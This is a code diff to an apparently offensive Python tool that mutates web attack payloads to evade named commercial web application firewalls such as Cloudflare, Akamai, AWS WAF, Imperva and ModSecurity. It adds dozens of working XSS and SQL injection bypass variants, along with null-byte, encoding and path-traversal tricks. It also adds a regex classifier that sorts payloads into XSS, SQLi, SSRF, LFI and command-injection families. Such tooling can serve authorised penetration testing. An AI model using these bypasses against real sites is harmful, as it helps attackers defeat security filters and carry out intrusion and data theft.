@@ -13,7 +13,7 @@ import html as html_mod
 import random
 import re
 import urllib.parse
-from typing import Dict, List, Optional
+from typing import Any, Dict, List, Optional
 
 
 # ── Mutation strategies ──────────────────────────────────────────────────
@@ -259,6 +259,13 @@ _VENDOR_MUTATIONS: Dict[str, List[tuple]] = {
         ("cf_javascript_uri", lambda p: f'<a href="javas\tcript:{p}">x</a>' if "alert" in p else p),
         ("cf_template_literal", lambda p: p.replace("alert(1)", "alert`1`")),
         ("cf_constructor", lambda p: p.replace("alert(1)", "[].constructor.constructor('alert(1)')()")),
+        ("cf_svg_animate", lambda p: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>' if "alert" in p else p),
+        ("cf_details_ontoggle", lambda p: '<details open ontoggle=alert(1)>' if "alert" in p else p),
+        ("cf_unicode_escape", lambda p: p.replace("alert", "\\u0061lert")),
+        ("cf_concat_eval", lambda p: p.replace("alert(1)", "window['al'+'ert'](1)")),
+        ("cf_settimeout", lambda p: p.replace("alert(1)", "setTimeout('ale'+'rt(1)')")),
+        ("cf_atob_bypass", lambda p: p.replace("alert(1)", "eval(atob('YWxlcnQoMSk='))")),
+        ("cf_proto_tab", lambda p: p.replace("javascript:", "java\x09script:")),
     ],
     "akamai": [
         ("ak_comment_break", lambda p: p.replace("script", "scr/**/ipt")),
@@ -266,27 +273,74 @@ _VENDOR_MUTATIONS: Dict[str, List[tuple]] = {
         ("ak_null_mid", lambda p: p[:len(p)//2] + "\x00" + p[len(p)//2:]),
         ("ak_concat_bypass", lambda p: p.replace("'", "' '") if "'" in p else p),
         ("ak_hex_encode", lambda p: "".join(f"\\x{ord(c):02x}" if not c.isalnum() else c for c in p)),
+        ("ak_charcode", lambda p: p.replace("alert(1)", "String.fromCharCode(97,108,101,114,116)(1)")),
+        ("ak_svg_set", lambda p: '<svg><set onbegin=alert(1)>' if "alert" in p else p),
+        ("ak_body_onpageshow", lambda p: '<body onpageshow=alert(1)>' if "alert" in p else p),
+        ("ak_unicode_space", lambda p: p.replace(" ", "\u00a0")),
+        ("ak_sqli_scientific", lambda p: p.replace("1=1", "1e0=1e0")),
+        ("ak_fullwidth_quote", lambda p: p.replace("'", "\uff07")),
     ],
     "aws_waf": [
         ("aws_case_mix", lambda p: p.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN")),
         ("aws_comment_inline", lambda p: p.replace(" ", "/*!")),
         ("aws_version_comment", lambda p: p.replace("UNION", "/*!50000UNION*/")),
         ("aws_chunk_encoding", lambda p: p.replace("script", "scr\r\nipt")),
+        ("aws_json_unicode", lambda p: p.replace("<", "\\u003c").replace(">", "\\u003e")),
+        ("aws_sqli_newline", lambda p: p.replace("UNION", "UN\nION").replace("SELECT", "SEL\nECT")),
+        ("aws_xss_tab_break", lambda p: p.replace("onerror", "on\terror")),
+        ("aws_header_inject", lambda p: p.replace(" OR ", " /*!OR*/ ")),
+        ("aws_base64_attr", lambda p: '<img src=x onerror=eval(atob`YWxlcnQoMSk=`)>' if "alert" in p else p),
     ],
     "imperva": [
         ("imp_hpc", lambda p: p.replace("/", "//")),
         ("imp_param_frag", lambda p: p.replace("=", "=%00")),
         ("imp_unicode_norm", lambda p: p.replace("a", "\u0430") if "alert" in p else p),  # Cyrillic а
         ("imp_multiline", lambda p: p.replace(" ", "\n")),
+        ("imp_sqli_hex_union", lambda p: p.replace("UNION", "UNI%6fN")),
+        ("imp_xss_foreignobj", lambda p: '<svg><foreignObject><body onload=alert(1)></foreignObject></svg>' if "alert" in p else p),
+        ("imp_tab_before_eq", lambda p: p.replace("=", "\t=")),
+        ("imp_backtick_quote", lambda p: p.replace("'", "`")),
+        ("imp_double_param", lambda p: f"{p}&_={p}"),
     ],
     "f5_bigip": [
         ("f5_url_full_encode", lambda p: "".join(f"%{ord(c):02x}" for c in p)),
         ("f5_overlong_utf8", lambda p: p.replace("<", "\xc0\xbc").replace(">", "\xc0\xbe")),
+        ("f5_sqli_version_comment", lambda p: p.replace("SELECT", "/*!12345SELECT*/")),
+        ("f5_xss_html5_events", lambda p: '<video><source onerror=alert(1)>' if "alert" in p else p),
+        ("f5_path_double_encode", lambda p: p.replace("/", "%252f")),
+        ("f5_newline_split", lambda p: p.replace("<script", "<scr\nipt")),
     ],
     "modsecurity": [
         ("mod_comment_nest", lambda p: p.replace("--", "-- -")),
         ("mod_charset_trick", lambda p: p.replace("'", "\xbf\x27")),  # GBK trick
         ("mod_payload_split", lambda p: p.replace("UNION SELECT", "UNION%0aSELECT")),
+        ("mod_sqli_like", lambda p: p.replace("1=1", "1 LIKE 1")),
+        ("mod_xss_slash_tag", lambda p: '<img/src/onerror=alert(1)>' if "alert" in p else p),
+        ("mod_null_after_tag", lambda p: p.replace("<script", "<script\x00")),
+        ("mod_paranoia_comment", lambda p: p.replace(" ", "/**/")),
+        ("mod_lfi_double", lambda p: p.replace("../", "....//") if "../" in p else p),
+    ],
+    "fastly": [
+        ("fst_encoding_mix", lambda p: p.replace("<", "%26lt%3b").replace(">", "%3e")),
+        ("fst_case_variation", lambda p: p.replace("script", "sCrIpT")),
+        ("fst_null_inject", lambda p: p.replace("<", "%00<")),
+        ("fst_sqli_having", lambda p: p.replace("1=1", "1 HAVING 1=1")),
+    ],
+    "sucuri": [
+        ("suc_event_swap", lambda p: p.replace("onerror", "onpointerenter")),
+        ("suc_sqli_between", lambda p: p.replace("1=1", "1 BETWEEN 1 AND 1")),
+        ("suc_xss_constructor", lambda p: p.replace("alert(1)", "[]['flat']['constructor']('alert(1)')()")),
+        ("suc_null_byte", lambda p: p.replace("script", "scri%00pt")),
+    ],
+    "barracuda": [
+        ("bar_case_break", lambda p: p.replace("SELECT", "SElect")),
+        ("bar_comment_inject", lambda p: p.replace(" ", "/**/") if "SELECT" in p.upper() else p),
+        ("bar_xss_details", lambda p: '<details/open/ontoggle=alert`1`>' if "alert" in p else p),
+    ],
+    "fortinet": [
+        ("fort_utf8_overlong", lambda p: p.replace("<", "%C0%BC")),
+        ("fort_sqli_union_nl", lambda p: p.replace("UNION", "UN%0aION")),
+        ("fort_xss_svg", lambda p: '<svg/onload=alert`1`>' if "alert" in p else p),
     ],
 }
 
@@ -364,6 +418,105 @@ def mutate_payload(payload: str,
                     continue
 
     return variants[:max_variants]
+
+
+# ── Payload clustering by technique family ────────────────────────────────
+
+_TECHNIQUE_PATTERNS: List[tuple] = [
+    # Order matters: more specific patterns first so they win in frequency count.
+    # (family, sub_technique, regex_pattern)
+    # ── High-specificity patterns (check first) ──
+    ("xxe", "entity_decl", re.compile(r'<!ENTITY|<!DOCTYPE.*\[', re.I)),
+    ("crlf", "header_inject", re.compile(r'%0[dD]%0[aA]|\\r\\n', re.I)),
+    ("prototype_pollution", "proto", re.compile(r'__proto__|constructor\[|prototype\[', re.I)),
+    ("open_redirect", "redirect_url", re.compile(r'(redirect|url|next|return|goto)\s*=\s*https?://', re.I)),
+    ("ssti", "jinja2", re.compile(r'__class__|__mro__|__subclasses__', re.I)),
+    ("ssti", "template_expr", re.compile(r'\{\{.*\}\}|\$\{.*\}|<%.*%>', re.I)),
+    # ── XSS ──
+    ("xss", "script_tag", re.compile(r'<script', re.I)),
+    ("xss", "event_handler", re.compile(r'\bon\w+\s*=', re.I)),
+    ("xss", "svg_injection", re.compile(r'<svg|<math', re.I)),
+    ("xss", "javascript_uri", re.compile(r'javascript\s*:', re.I)),
+    ("xss", "data_uri", re.compile(r'data\s*:\s*text/html', re.I)),
+    ("xss", "dom_manipulation", re.compile(r'document\.(cookie|write|location)|innerHTML', re.I)),
+    # ── SQLi ──
+    ("sqli", "union_based", re.compile(r'UNION\s+(ALL\s+)?SELECT', re.I)),
+    ("sqli", "boolean_blind", re.compile(r'\bOR\s+\d+=\d+|\bAND\s+\d+=\d+', re.I)),
+    ("sqli", "time_blind", re.compile(r'SLEEP\s*\(|WAITFOR\s+DELAY|pg_sleep|BENCHMARK', re.I)),
+    ("sqli", "error_based", re.compile(r'EXTRACTVALUE|UPDATEXML|XMLTYPE|CONVERT\(', re.I)),
+    ("sqli", "stacked_query", re.compile(r';\s*(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE)', re.I)),
+    ("sqli", "comment_bypass", re.compile(r'/\*!?\d*\w+\*/|--\s', re.I)),
+    # ── SSRF ──
+    ("ssrf", "cloud_metadata", re.compile(r'169\.254\.169\.254|metadata\.google', re.I)),
+    ("ssrf", "url_scheme", re.compile(r'(gopher|dict)://', re.I)),
+    # ── LFI ──
+    ("lfi", "path_traversal", re.compile(r'\.\./|\.\.\\|%2e%2e', re.I)),
+    ("lfi", "null_byte", re.compile(r'%00|\\x00', re.I)),
+    ("lfi", "wrapper", re.compile(r'php://|expect://|zip://', re.I)),
+    # ── RCE ──
+    ("rce", "command_injection", re.compile(r'[;|`]\s*\w+|&&\s*\w+|\$\(', re.I)),
+    ("rce", "os_command", re.compile(r'\b(cat|ls|whoami|id|uname|ping|curl|wget)\b', re.I)),
+]
+
+
+def classify_payload(payload: str) -> Dict[str, Any]:
+    """Classify a payload into technique family and sub-technique.
+
+    Returns dict with:
+      - family: str (xss, sqli, ssrf, lfi, rce, ssti, xxe, crlf, etc.)
+      - sub_technique: str (e.g. "union_based", "event_handler")
+      - techniques: list of all matched (family, sub_technique) pairs
+      - confidence: float 0-1
+    """
+    matches = []
+    for family, sub, pattern in _TECHNIQUE_PATTERNS:
+        if pattern.search(payload):
+            matches.append((family, sub))
+
+    if not matches:
+        return {"family": "unknown", "sub_technique": "unknown",
+                "techniques": [], "confidence": 0.0}
+
+    # Primary family = most frequent match
+    from collections import Counter
+    family_counts = Counter(f for f, _ in matches)
+    primary_family = family_counts.most_common(1)[0][0]
+    primary_sub = next(s for f, s in matches if f == primary_family)
+
+    return {
+        "family": primary_family,
+        "sub_technique": primary_sub,
+        "techniques": matches,
+        "confidence": min(1.0, len(matches) * 0.25),
+    }
+
+
+def cluster_payloads(payloads: List[str]) -> Dict[str, List[str]]:
+    """Group payloads by technique family.
+
+    Returns dict mapping family name → list of payloads.
+    """
+    clusters: Dict[str, List[str]] = {}
+    for p in payloads:
+        info = classify_payload(p)
+        family = info["family"]
+        clusters.setdefault(family, []).append(p)
+    return clusters
+
+
+def cluster_results(results: List[dict]) -> Dict[str, List[dict]]:
+    """Group test results by technique family.
+
+    Returns dict mapping family → list of result dicts (with 'technique' added).
+    """
+    clusters: Dict[str, List[dict]] = {}
+    for r in results:
+        payload = r.get("payload", "")
+        info = classify_payload(payload)
+        r["technique_family"] = info["family"]
+        r["technique_sub"] = info["sub_technique"]
+        clusters.setdefault(info["family"], []).append(r)
+    return clusters
 
 
 def mutate_blocked_results(results: List[dict],
